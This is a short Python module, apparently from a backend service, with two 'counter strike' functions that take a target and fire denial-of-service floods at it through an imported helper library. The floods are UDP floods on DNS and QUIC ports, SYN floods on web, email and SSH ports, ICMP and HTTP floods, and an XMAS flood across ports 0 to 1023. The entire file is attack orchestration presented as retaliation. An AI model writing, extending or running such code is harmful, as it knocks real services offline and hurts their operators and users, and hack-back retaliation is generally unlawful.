import backend.app.services.counter_strike_helper
def full_scale_counter_strike(target):
    backend.app.services.counter_strike_helper.attack_UDP("UDP-Mix",target,53,300) # DNS
    backend.app.services.counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 300) # QUIC
    backend.app.services.counter_strike_helper.synflood(target,80,200) # HTTP
    backend.app.services.counter_strike_helper.synflood(target, 443, 200) # HTTPS
    backend.app.services.counter_strike_helper.synflood(target, 25, 200) # Email
    backend.app.services.counter_strike_helper.synflood(target, 587, 200) # Email
    backend.app.services.counter_strike_helper.synflood(target, 465, 200) # Email
    backend.app.services.counter_strike_helper.synflood(target, 143, 200) # Email
    backend.app.services.counter_strike_helper.synflood(target, 993, 200) # Email
    backend.app.services.counter_strike_helper.synflood(target, 22, 200) # SSH
    backend.app.services.counter_strike_helper.icmpflood(target,200) # ICMP
    backend.app.services.counter_strike_helper.attack_http_flood(target,80,30000) # http flood
    for port in range(0,1024): # xmas flood
        backend.app.services.counter_strike_helper.xmasflood(target,port,50)

def fast_counter_strike(target):
    backend.app.services.counter_strike_helper.attack_UDP("UDP-Mix", target, 53, 120)  # DNS
    backend.app.services.counter_strike_helper.synflood(target, 80, 100)  # HTTP
    backend.app.services.counter_strike_helper.synflood(target, 443, 100)  # HTTPS
    backend.app.services.counter_strike_helper.synflood(target, 25, 100)  # Email
    backend.app.services.counter_strike_helper.synflood(target, 587, 100)  # Email
    backend.app.services.counter_strike_helper.icmpflood(target, 80) # ICMP
    backend.app.services.counter_strike_helper.attack_http_flood(target, 80, 10000) # http flood


